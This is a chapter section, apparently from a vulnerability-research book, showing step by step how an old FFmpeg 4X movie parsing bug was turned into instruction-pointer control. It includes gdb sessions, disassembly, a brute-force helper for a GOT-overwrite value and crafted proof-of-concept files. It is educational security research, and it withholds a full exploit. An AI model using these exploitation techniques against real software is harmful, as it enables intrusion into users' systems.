+<html xmlns="http://www.w3.org/1999/xhtml"><head><title>4.2 Exploitation</title><link rel="stylesheet" href="core.css" type="text/css"/><meta name="generator" content="DocBook XSL Stylesheets V1.74.0"/></head><body><div class="sect1" title="4.2 Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="exploitation-id2"/>4.2 Exploitation</h1></div></div></div><p>To exploit the vulnerability I did the following:</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>The vulnerability affects all operating system platforms supported by FFmpeg. The platform that I used throughout this chapter was the default installation of Ubuntu Linux 9.04 (32-bit)</em></span>.<a id="IDX-CHP-4-0008" class="indexterm"/></p></div><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: Find a sample 4X movie file with a valid <code class="literal">strk</code> chunk.</p></li><li class="listitem"><p>Step 2: Learn about the layout of the <code class="literal">strk</code> chunk.</p></li><li class="listitem"><p>Step 3: Manipulate the <code class="literal">strk</code> chunk to crash FFmpeg.</p></li><li class="listitem"><p>Step 4: Manipulate the <code class="literal">strk</code> chunk to get control over <code class="literal">EIP</code>.</p></li></ul></div><p>There are different ways to exploit file format bugs. I could either create a file with the right format from scratch or alter an existing file. I chose the latter approach. I used the website <a class="ulink" href="http://samples.mplayerhq.hu/">http://samples.mplayerhq.hu/</a> to find a 4X movie file suitable for testing this vulnerability. I could have built a file myself, but downloading a preexisting file is fast and easy.</p><div class="sect2" title="Step 1: Find a Sample 4X Movie File with a Valid strk Chunk"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_find_a_sample_4x_movie_file"/>Step 1: Find a Sample 4X Movie File with a Valid strk Chunk</h2></div></div></div><p>I used the following to get a sample file from <a class="ulink" href="http://samples.mplayerhq.hu/">http://samples.mplayerhq.hu/</a>.</p><a id="I_programlisting4_d1e3919"/><pre class="programlisting">linux$ <strong class="userinput"><code>wget -q http://samples.mplayerhq.hu/ga</code></strong>
+<strong class="userinput"><code>me-formats/4xm/</code></strong>
+                     → <strong class="userinput"><code>TimeGatep01s01n01a02_2.4xm</code></strong></pre><p>After downloading the file, I renamed it <span class="emphasis"><em>original.4xm</em></span>.</p></div><div class="sect2" title="Step 2: Learn About the Layout of the strk Chunk"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_learn_about_the_layout_of_t"/>Step 2: Learn About the Layout of the strk Chunk</h2></div></div></div><p>According to the 4X movie file format description, a <code class="literal">strk</code> chunk has the following structure:</p><a id="I_programlisting4_d1e3942"/><pre class="programlisting">bytes 0-3    fourcc: 'strk'
+bytes 4-7    length of strk structure (40 or 0x28 bytes)
+bytes 8-11   track number
+bytes 12-15  audio type: 0 = PCM, 1 = 4X IMA ADPCM
+bytes 16-35  unknown
+bytes 36-39  number of audio channels
+bytes 40-43  audio sample rate
+bytes 44-47  audio sample resolution (8 or 16 bits)</pre><p>The <code class="literal">strk</code> chunk of the downloaded sample file starts at file offset <code class="literal">0x1a6</code>, as shown in <a class="xref" href="ch04s02.html#a_strk_chunk_from_the_4x_movie_sample_fi" title="Figure 4-4. A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in Table 4-1.">Figure 4-4</a>:</p><div class="figure"><a id="a_strk_chunk_from_the_4x_movie_sample_fi"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e3962"/><img src="httpatomoreillycomsourcenostarchimages939269.png.jpg" alt="A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in ."/></div></div><p class="title">Figure 4-4. A <code class="literal">strk</code> chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in <a class="xref" href="ch04s02.html#components_of_strk_chunk_layout_shown_in" title="Table 4-1. Components of strk Chunk Layout Shown in Figure 4-4">Table 4-1</a>.</p></div><p><a class="xref" href="ch04s02.html#components_of_strk_chunk_layout_shown_in" title="Table 4-1. Components of strk Chunk Layout Shown in Figure 4-4">Table 4-1</a> describes the layout of the <code class="literal">strk</code> chunk illustrated in <a class="xref" href="ch04s02.html#a_strk_chunk_from_the_4x_movie_sample_fi" title="Figure 4-4. A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in Table 4-1.">Figure 4-4</a>.</p><div class="table"><a id="components_of_strk_chunk_layout_shown_in"/><p class="title">Table 4-1. Components of strk Chunk Layout Shown in <a class="xref" href="ch04s02.html#a_strk_chunk_from_the_4x_movie_sample_fi" title="Figure 4-4. A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in Table 4-1.">Figure 4-4</a></p><div class="table-contents"><table summary="Components of strk Chunk Layout Shown in " style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>Reference</p></th><th style="text-align: left" valign="bottom"><p>Header offset</p></th><th style="text-align: left" valign="bottom"><p>Description</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p>(1)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">fourcc: 'strk'</code></p></td></tr><tr><td style="text-align: left" valign="top"><p>(2)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i+4]</code></p></td><td style="text-align: left" valign="top"><p>length of <code class="literal">strk</code> structure (<code class="literal">0x28</code> bytes)</p></td></tr><tr><td style="text-align: left" valign="top"><p>(3)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i+8]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">track number</code> (this is the <code class="literal">current_track</code> variable from FFmpeg source code)</p></td></tr><tr><td style="text-align: left" valign="top"><p>(4)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i+12]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">audio type</code> (this is the value that gets written at the first dereferenced memory location)</p></td></tr></tbody></table></div></div><p>To exploit this vulnerability, I knew that I would need to set the values of <code class="literal">track number</code> at <code class="literal">&amp;header[i+8]</code> (that corresponds to <code class="literal">current_track</code> from FFmpeg source code) and <code class="literal">audio type</code> at <code class="literal">&amp;header[i+12]</code>. If I set the values properly, the value of <code class="literal">audio type</code> would be written at the memory location <code class="literal">NULL + track number</code>, which is the same as <code class="literal">NULL + current_track</code>.</p><p>In summary, the (nearly) arbitrary memory write operations from the FFmpeg source code are as follows:</p><a id="I_programlisting4_d1e4082"/><pre class="programlisting">[..]
+178       fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);
+179       fourxm-&gt;tracks[current_track].channels = AV_RL32(&amp;header[i + 36]);
+180       fourxm-&gt;tracks[current_track].sample_rate = AV_RL32(&amp;header[i + 40]);
+181       fourxm-&gt;tracks[current_track].bits = AV_RL32(&amp;header[i + 44]);
+[..]</pre><p>And each corresponds to this pseudo code:</p><a id="I_programlisting4_d1e4087"/><pre class="programlisting">NULL[user_controlled_value].offset = user_controlled_data;</pre></div><div class="sect2" title="Step 3: Manipulate the strk Chunk to Crash FFmpeg"><div class="titlepage"><div><div><h2 class="title"><a id="step_3_colon_manipulate_the_strk_chunk_t"/>Step 3: Manipulate the strk Chunk to Crash FFmpeg</h2></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Compiling FFmpeg: linux$ ./configure; make These commands will compile two different binary versions of FFmpeg</em></span>:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p><span class="underline">ffmpeg</span> <span class="emphasis"><em>Binary without debugging symbols</em></span></p></li><li class="listitem"><p><span class="underline">ffmpeg_g</span> <span class="emphasis"><em>Binary with debugging symbols</em></span></p></li></ul></div></div><p>After compiling the vulnerable FFmpeg source code revision 16556, I tried to convert the 4X movie into an AVI file to verify that the compilation was successful and that FFmpeg worked flawlessly.</p><a id="I_programlisting4_d1e4114"/><pre class="programlisting">linux$ <strong class="userinput"><code>./ffmpeg_g -i original.4xm original.avi</code></strong>
+FFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.
+  configuration:
+  libavutil     49.12. 0 / 49.12. 0
+  libavcodec    52.10. 0 / 52.10. 0
+  libavformat   52.23. 1 / 52.23. 1
+  libavdevice   52. 1. 0 / 52. 1. 0
+  built on Jan 24 2009 02:30:50, gcc: 4.3.3
+Input #0, 4xm, from 'original.4xm':
+  Duration: 00:00:13.20, start: 0.000000, bitrate: 704 kb/s
+    Stream #0.0: Video: 4xm, rgb565, 640x480, 15.00 tb(r)
+    Stream #0.1: Audio: pcm_s16le, 22050 Hz, stereo, s16, 705 kb/s
+Output #0, avi, to 'original.avi':
+    Stream #0.0: Video: mpeg4, yuv420p, 640x480, q=2-31, 200 kb/s, 15.00 tb(c)
+    Stream #0.1: Audio: mp2, 22050 Hz, stereo, s16, 64 kb/s
+Stream mapping:
+  Stream #0.0 -&gt; #0.0
+  Stream #0.1 -&gt; #0.1
+Press [q] to stop encoding
+frame=   47 fps=  0 q=2.3 Lsize=     194kB time=3.08 bitrate= 515.3kbits/s
+video:158kB audio:24kB global headers:0kB muxing overhead 6.715897%</pre><p>Next, I modified the values of <code class="literal">track number</code> as well as <code class="literal">audio type</code> in the <code class="literal">strk</code> chunk of the sample file.</p><p>As illustrated in <a class="xref" href="ch04s02.html#the_strk_chunk_of_the_sample_file_after" title="Figure 4-5. The strk chunk of the sample file after I altered it. The changes I made are highlighted and framed, and the numbers shown are referenced in the text above.">Figure 4-5</a>, I changed the value of <code class="literal">track number</code> to <code class="literal">0xaaaaaaaa</code> (1) and the value of <code class="literal">audio type</code> to <code class="literal">0xbbbbbbbb</code> (2). I named the new file <span class="emphasis"><em>poc1.4xm</em></span> and tried to convert it with FFmpeg (see Section B.4 for a description of the following debugger commands).</p><div class="figure"><a id="the_strk_chunk_of_the_sample_file_after"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4156"/><img src="httpatomoreillycomsourcenostarchimages939271.png.jpg" alt="The strk chunk of the sample file after I altered it. The changes I made are highlighted and framed, and the numbers shown are referenced in the text above."/></div></div><p class="title">Figure 4-5. The <code class="literal">strk</code> chunk of the sample file after I altered it. The changes I made are highlighted and framed, and the numbers shown are referenced in the text above.</p></div><a id="I_programlisting4_d1e4161"/><pre class="programlisting">linux$ <strong class="userinput"><code>gdb ./ffmpeg_g</code></strong>
+GNU gdb 6.8-debian
+Copyright (C) 2008 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu"...
+
+(gdb) <strong class="userinput"><code>set disassembly-flavor intel</code></strong>
+
+(gdb) <strong class="userinput"><code>run -i poc1.4xm</code></strong>
+Starting program: /home/tk/BHD/ffmpeg/ffmpeg_g -i poc1.4xm
+FFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.
+  configuration:
+  libavutil     49.12. 0 / 49.12. 0
+  libavcodec    52.10. 0 / 52.10. 0
+  libavformat   52.23. 1 / 52.23. 1
+  libavdevice   52. 1. 0 / 52. 1. 0
+  built on Jan 24 2009 02:30:50, gcc: 4.3.3
+
+<strong class="userinput"><code>Program received signal SIGSEGV, Segmentation fault.</code></strong>
+<strong class="userinput"><code>0x0809c89d in fourxm_read_header (s=0x8913330,</code></strong>
+ <strong class="userinput"><code>ap=0xbf8b6c24) at libavformat/4xm.c:178</code></strong>
+<strong class="userinput"><code>178     fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);</code></strong></pre><p>As expected, FFmpeg crashed with a segmentation fault at source code line 178. I further analyzed the FFmpeg process within the debugger to see what exactly caused the crash.</p><a id="I_programlisting4_d1e4186"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info registers</code></strong>
+<strong class="userinput"><code>eax            0xbbbbbbbb</code></strong>    −1145324613
+ecx            0x891c400     143770624
+edx            0x0           0
+<strong class="userinput"><code>ebx            0xaaaaaaaa</code></strong>    −1431655766
+esp            0xbf8b6aa0    0xbf8b6aa0
+ebp            0x55555548    0x55555548
+esi            0x891c3c0     143770560
+edi            0x891c340     143770432
+eip            0x809c89d     0x809c89d &lt;fourxm_read_header+509&gt;
+eflags         0x10207       [ CF PF IF RF ]
+cs             0x73          115
+ss             0x7b          123
+ds             0x7b          123
+es             0x7b          123
+fs             0x0           0
+gs             0x33          51</pre><p>At the time of the crash, the registers <code class="literal">EAX</code> and <code class="literal">EBX</code> were filled with the values that I input for <code class="literal">audio type</code> (<code class="literal">0xbbbbbbbb</code>) and <code class="literal">track number</code> (<code class="literal">0xaaaaaaaa</code>). Next, I asked the debugger to display the last instruction executed by FFmpeg:</p><a id="I_programlisting4_d1e4219"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1i $eip</code></strong>
+0x809c89d &lt;fourxm_read_header+509&gt;:    mov    DWORD PTR [edx+ebp*1+0x10],eax</pre><p>As the debugger output shows, the instruction that caused the segmentation fault was attempting to write the value <code class="literal">0xbbbbbbbb</code> at an address calculated using my value for <code class="literal">track number</code>.</p><p>To control the memory write, I needed to know how the destination address of the write operation was calculated. I found the answer by looking at the following assembly code:</p><a id="I_programlisting4_d1e4234"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/7i $eip - 21</code></strong>
+0x809c888 &lt;fourxm_read_header+488&gt;:    lea    ebp,[ebx+ebx*4]
+0x809c88b &lt;fourxm_read_header+491&gt;:    mov    eax,DWORD PTR [esp+0x34]
+0x809c88f &lt;fourxm_read_header+495&gt;:    mov    edx,DWORD PTR [esi+0x10]
+0x809c892 &lt;fourxm_read_header+498&gt;:    mov    DWORD PTR [esp+0x28],ebp
+0x809c896 &lt;fourxm_read_header+502&gt;:    shl    ebp,0x2
+0x809c899 &lt;fourxm_read_header+505&gt;:    mov    eax,DWORD PTR [ecx+eax*1+0xc]
+0x809c89d &lt;fourxm_read_header+509&gt;:    mov    DWORD PTR [edx+ebp*1+0x10],eax</pre><p>These instructions correspond to the following C source line:</p><a id="I_programlisting4_d1e4241"/><pre class="programlisting">[..]
+178       fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);
+[..]</pre><p><a class="xref" href="ch04s02.html#list_of_the_assembler_instructions_and" title="Table 4-2. List of the Assembler Instructions and the Result of Each Instruction">Table 4-2</a> explains the results of these instructions.</p><p>Since <code class="literal">EBX</code> contains the value I supplied for <code class="literal">current_track</code> and <code class="literal">EDX</code> contains the NULL pointer of <code class="literal">fourxm-&gt;tracks</code>, the calculation can be expressed as this:</p><a id="I_programlisting4_d1e4260"/><pre class="programlisting">edx + ((ebx + ebx * 4) &lt;&lt; 2) + 0x10 = destination address of the write operation</pre><div class="table"><a id="list_of_the_assembler_instructions_and"/><p class="title">Table 4-2. List of the Assembler Instructions and the Result of Each Instruction</p><div class="table-contents"><table summary="List of the Assembler Instructions and the Result of Each Instruction" style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>Instruction<a id="IDX-CHP-4-0009" class="indexterm"/><a id="IDX-CHP-4-0010" class="indexterm"/><a id="IDX-CHP-4-0011" class="indexterm"/></p></th><th style="text-align: left" valign="bottom"><p>Result</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p><code class="literal">lea ebp,[ebx+ebx*4]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">ebp = ebx + ebx * 4</code> (The <code class="literal">EBX</code> register contains the user-defined value of <code class="literal">current_track</code> (<code class="literal">0xaaaaaaaa</code>).)</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov eax,DWORD PTR [esp+0x34]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">eax</code> = array index <code class="literal">i</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov edx,DWORD PTR [esi+0x10]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">edx = fourxm-&gt;tracks</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">shl ebp,0x2</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">ebp = ebp &lt;&lt; 2</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov eax,DWORD PTR [ecx+eax*1+0xc]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">eax = AV_RL32(&amp;header[i + 12]);</code> or <code class="literal">eax = ecx[eax + 0xc];</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov DWORD PTR [edx+ebp*1+0x10],eax</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">fourxm-&gt;tracks[current_track].adpcm = eax;</code> or <code class="literal">edx[ebp + 0x10] = eax;</code></p></td></tr></tbody></table></div></div><p>Or in a more simplified form:</p><a id="I_programlisting4_d1e4362"/><pre class="programlisting">edx + (ebx * 20) + 0x10 = destination address of the write operation</pre><p>I supplied the value <code class="literal">0xaaaaaaaa</code> for <code class="literal">current_track</code> (<code class="literal">EBX</code> register), so the calculation should look like this:</p><a id="I_programlisting4_d1e4375"/><pre class="programlisting">NULL + (0xaaaaaaaa * 20) + 0x10 = 0x55555558</pre><p>The result of <code class="literal">0x55555558</code> can be confirmed with the help of the debugger:</p><a id="I_programlisting4_d1e4382"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1x $edx+$ebp+0x10</code></strong>
+0x55555558:    Cannot access memory at address 0x55555558</pre></div><div class="sect2" title="Step 4: Manipulate the strk Chunk to Gain Control over EIP"><div class="titlepage"><div><div><h2 class="title"><a id="step_4_colon_manipulate_the_strk_chunk"/>Step 4: Manipulate the strk Chunk to Gain Control over EIP</h2></div></div></div><p>The vulnerability allowed me to overwrite nearly arbitrary memory addresses with any 4-byte value. To gain control of the execution flow of FFmpeg, I had to overwrite a memory location that would allow me to control the <code class="literal">EIP</code> register. I had to find a stable address, one that was predictable within the address space of FFmpeg. That ruled out all stack addresses of the process. But the <span class="emphasis"><em>Executable and Linkable Format</em></span> (<span class="emphasis"><em>ELF</em></span>) used by Linux provides an almost perfect target: the <span class="emphasis"><em>Global Offset Table</em></span> (<span class="emphasis"><em>GOT</em></span>). Every library function used in FFmpeg has a reference in the GOT. By manipulating GOT entries, I could easily gain control of the execution flow (see Section A.4). The good thing about the GOT is that it’s predictable, which is exactly what I needed. I could gain control of <code class="literal">EIP</code> by overwriting the GOT entry of a library function that is called after the vulnerability happens.</p><p>So, what library function is called after the arbitrary memory writes? To answer this question, I had a look at the source code again:</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>libavformat/4xm.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">fourxm_read_header()</code></p></dd></dl></div><a id="I_programlisting4_d1e4430"/><pre class="programlisting">[..]
+184         /* allocate a new AVStream */
+<strong class="userinput"><code>185         st = av_new_stream(s, current_track);</code></strong>
+[..]</pre><p>Directly after the four memory-write operations, a new <code class="literal">AVStream</code> is allocated using the function <code class="literal">av_new_stream()</code>.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>libavformat/utils.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">av_new_stream()</code></p></dd></dl></div><a id="I_programlisting4_d1e4460"/><pre class="programlisting">[..]
+<strong class="userinput"><code>2271    AVStream *av_new_stream(AVFormatContext *s, int id)</code></strong>
+2272    {
+2273        AVStream *st;
+2274        int i;
+2275
+2276        if (s-&gt;nb_streams &gt;= MAX_STREAMS)
+2277            return NULL;
+2278
+<strong class="userinput"><code>2279        st = av_mallocz(sizeof(AVStream));</code></strong>
+[..]</pre><p>In line 2279 another function named <code class="literal">av_mallocz()</code> is called.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>libavutil/mem.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Functions</strong></span></span></dt><dd><p><code class="literal">av_mallocz()</code> and <code class="literal">av_malloc()</code></p></dd></dl></div><a id="I_programlisting4_d1e4493"/><pre class="programlisting">[..]
+<strong class="userinput"><code>43    void *av_malloc(unsigned int size)</code></strong>
+44    {
+45        void *ptr = NULL;
+46    #ifdef CONFIG_MEMALIGN_HACK
+47        long diff;
+48    #endif
+49
+50        /* let's disallow possible ambiguous cases */
+51        if(size &gt; (INT_MAX-16) )
+52            return NULL;
+53
+54    #ifdef CONFIG_MEMALIGN_HACK
+55        ptr = malloc(size+16);
+56        if(!ptr)
+57            return ptr;
+58        diff= ((-(long)ptr - 1)&amp;15) + 1;
+59        ptr = (char*)ptr + diff;
+60        ((char*)ptr)[-1]= diff;
+61    #elif defined (HAVE_POSIX_MEMALIGN)
+62        posix_memalign(&amp;ptr,16,size);
+63    #elif defined (HAVE_MEMALIGN)
+<strong class="userinput"><code>64        ptr = memalign(16,size);</code></strong>
+[..]
+<strong class="userinput"><code>135    void *av_mallocz(unsigned int size)</code></strong>
+136    {
+<strong class="userinput"><code>137        void *ptr = av_malloc(size);</code></strong>
+138        if (ptr)
+139            memset(ptr, 0, size);
+140        return ptr;
+141    }
+[..]</pre><p>In line 137 the function <code class="literal">av_malloc()</code> is called, and it calls <code class="literal">memalign()</code> in line 64 (the other <code class="literal">ifdef</code> cases—lines 54 and 61—are not defined when using the Ubuntu Linux 9.04 platform). I was excited to see <code class="literal">memalign()</code> because it was exactly what I was looking for: a library function that’s called directly after the vulnerability happens (see <a class="xref" href="ch04s02.html#a_call_graph_showing_the_path_from_the_v" title="Figure 4-6. A call graph showing the path from the vulnerable function to memalign()">Figure 4-6</a>).<a id="IDX-CHP-4-0012" class="indexterm"/><a id="IDX-CHP-4-0013" class="indexterm"/></p><div class="figure"><a id="a_call_graph_showing_the_path_from_the_v"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4538"/><img src="httpatomoreillycomsourcenostarchimages939273.png.jpg" alt="A call graph showing the path from the vulnerable function to memalign()"/></div></div><p class="title">Figure 4-6. A call graph showing the path from the vulnerable function to <code class="literal">memalign()</code></p></div><p>That brought me to the next question: What is the address of the GOT entry of <code class="literal">memalign()</code> in FFmpeg?</p><p>I gained this information with the help of <code class="literal">objdump</code>:<a id="IDX-CHP-4-0014" class="indexterm"/></p><a id="I_programlisting4_d1e4556"/><pre class="programlisting">linux$ <strong class="userinput"><code>objdump -R ffmpeg_g | grep memalign</code></strong>
+08560204 R_386_JUMP_SLOT   posix_memalign</pre><p>So the address I had to overwrite was <code class="literal">0x08560204</code>. All I had to do was calculate an appropriate value for <code class="literal">track number</code> (<code class="literal">current_track</code>). I could get that value in either of two ways: I could try to calculate it, or I could use brute force. I chose the easy option and wrote the following program:</p><div class="example"><a id="little_helper_program_to"/><p class="title">Example 4-1. Little helper program to use brute force to find the appropriate value for <code class="literal">current_track</code> (<span class="emphasis"><em>addr_brute_force.c</em></span>)</p><div class="example-contents"><pre class="programlisting">01    #include &lt;stdio.h&gt;
+02
+03    // GOT entry address of memalign()
+04    #define MEMALIGN_GOT_ADDR       0x08560204
+05
+06    // Min and max value for 'current_track'
+07    #define SEARCH_START            0x80000000
+08    #define SEARCH_END              0xFFFFFFFF
+09
+10    int
+11    main (void)
+12    {
+13           unsigned int  a, b    = 0;
+14
+15           for (a = SEARCH_START; a &lt; SEARCH_END; a++) {
+16                   b = (a * 20) + 0x10;
+17                   if (b == MEMALIGN_GOT_ADDR) {
+18                         printf ("Value for 'current_track': %08x\n", a);
+19                         return 0;
+20                   }
+21           }
+22
+23           printf ("No valid value for 'current_track' found.\n");
+24
+25           return 1;
+26    }</pre></div></div><p>The program illustrated in <a class="xref" href="ch04s02.html#little_helper_program_to" title="Example 4-1. Little helper program to use brute force to find the appropriate value for current_track (addr_brute_force.c)">Example 4-1</a> uses brute force to find an appropriate <code class="literal">track number</code> (<code class="literal">current_track</code>) value, which is needed to overwrite the (GOT) address defined in line 4. This is done by trying all possible values for <code class="literal">current_track</code> until the result of the calculation (see line 16) matches the searched GOT entry address of <code class="literal">memalign()</code> (see line 17). To trigger the vulnerability, <code class="literal">current_track</code> has to be interpreted as negative, so only values in the range of <code class="literal">0x80000000</code> to <code class="literal">0xffffffff</code> are considered (see line 15).</p><p>Example:</p><a id="I_programlisting4_d1e4611"/><pre class="programlisting">linux$ <strong class="userinput"><code>gcc -o addr_brute_force addr_brute_force.c</code></strong>
+linux$ <strong class="userinput"><code>./addr_brute_force</code></strong>
+Value for 'current_track': 8d378019</pre><p>I then adjusted the sample file and renamed it <span class="emphasis"><em>poc2.4xm</em></span>.</p><p>The only thing I changed was the value of <code class="literal">track number</code> (see (1) in <a class="xref" href="ch04s02.html#the_strk_chunk_of_poc2.4xm_after_i_adjus" title="Figure 4-7. The strk chunk of poc2.4xm after I adjusted the track number (current_track)">Figure 4-7</a>). It now matched the value generated by my little helper program.</p><div class="figure"><a id="the_strk_chunk_of_poc2.4xm_after_i_adjus"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4647"/><img src="httpatomoreillycomsourcenostarchimages939275.png.jpg" alt="The strk chunk of poc2.4xm after I adjusted the track number (current_track)"/></div></div><p class="title">Figure 4-7. The <code class="literal">strk</code> chunk of <span class="emphasis"><em>poc2.4xm</em></span> after I adjusted the <code class="literal">track number</code> (<code class="literal">current_track</code>)</p></div><p>I then tested the new proof-of-concept file in the debugger (see Section B.4 for a description of the following debugger commands).</p><a id="I_programlisting4_d1e4654"/><pre class="programlisting">linux$ <strong class="userinput"><code>gdb -q ./ffmpeg_g</code></strong>
+
+(gdb) <strong class="userinput"><code>run -i poc2.4xm</code></strong>
+Starting program: /home/tk/BHD/ffmpeg/ffmpeg_g -i poc2.4xm
+FFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.
+  configuration:
+  libavutil     49.12. 0 / 49.12. 0
+  libavcodec    52.10. 0 / 52.10. 0
+  libavformat   52.23. 1 / 52.23. 1
+  libavdevice   52. 1. 0 / 52. 1. 0
+  built on Jan 24 2009 02:30:50, gcc: 4.3.3
+
+Program received signal SIGSEGV, Segmentation fault.
+<strong class="userinput"><code>0xbbbbbbbb in ?? ()</code></strong>
+
+(gdb) <strong class="userinput"><code>info registers</code></strong>
+eax            0xbfc1ddd0    −1077813808
+ecx            0x9f69400     167154688
+edx            0x9f60330     167117616
+ebx            0x0           0
+esp            0xbfc1ddac    0xbfc1ddac
+ebp            0x85601f4     0x85601f4
+esi            0x164         356
+edi            0x9f60330     167117616
+<strong class="userinput"><code>eip            0xbbbbbbbb    0xbbbbbbbb</code></strong>
+eflags         0x10293       [ CF AF SF IF RF ]
+cs             0x73          115
+ss             0x7b          123
+ds             0x7b          123
+es             0x7b          123
+fs             0x0           0
+gs             0x33          51</pre><p>Bingo! Full control over <code class="literal">EIP</code>. After I gained control over the instruction pointer, I developed an exploit for the vulnerability. I used the VLC media player as an injection vector, because it uses the vulnerable version of FFmpeg.<a id="IDX-CHP-4-0015" class="indexterm"/><a id="IDX-CHP-4-0016" class="indexterm"/></p><p>As I’ve said in previous chapters, the laws in Germany do not allow me to provide a full working exploit, but you can watch a short video I recorded that shows the exploit in action on the book’s website.<sup>[<a href="ch04s05.html#ftn.CHP-4-FN-5" class="footnoteref">41</a>]</sup></p><p><a class="xref" href="ch04s02.html#diagram_of_my_exploitation_of_the_ffmpeg" title="Figure 4-8. Diagram of my exploitation of the FFmpeg bug">Figure 4-8</a> summarizes the steps I used to exploit the vulnerability. Here is the anatomy of the bug shown in this figure:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>The destination address for the memory write is calculated while using <code class="literal">current_track</code> as an index (<code class="literal">NULL</code> + <code class="literal">current_track</code> + offset). The value of <code class="literal">current_track</code> derives from user-controlled data of the 4xm media file.</p></li><li class="listitem"><p>The source data of the memory write derives from user-controlled data of the media file.</p></li><li class="listitem"><p>The user-controlled data is copied at the memory location of the <code class="literal">memalign()</code> GOT entry.</p></li></ol></div><div class="figure"><a id="diagram_of_my_exploitation_of_the_ffmpeg"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4718"/><img src="httpatomoreillycomsourcenostarchimages939277.png.jpg" alt="Diagram of my exploitation of the FFmpeg bug"/></div></div><p class="title">Figure 4-8. Diagram of my exploitation of the FFmpeg bug</p></div></div></div></body></html>
